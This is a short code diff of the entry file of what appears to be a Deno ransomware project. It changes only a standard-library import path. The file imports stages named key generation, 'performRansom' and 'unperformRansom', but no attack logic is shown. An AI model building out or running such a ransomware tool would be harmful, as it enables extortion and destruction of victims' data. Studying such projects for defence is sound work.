@@ -1,7 +1,7 @@
 import { generateKeys } from "./stages/keygen/generate_keys.ts";
 import { performRansom } from "./stages/perform_ransom/perform_ransom.ts";
 import { unperformRansom } from "./stages/unperform_ransom/unperform_ransom.ts";
-import { exists } from "jsr:@std/fs/exists";
+import { exists } from "@std/fs/exists";
 
 // Learn more at https://docs.deno.com/runtime/manual/examples/module_metadata#concepts
 if (import.meta.main) {
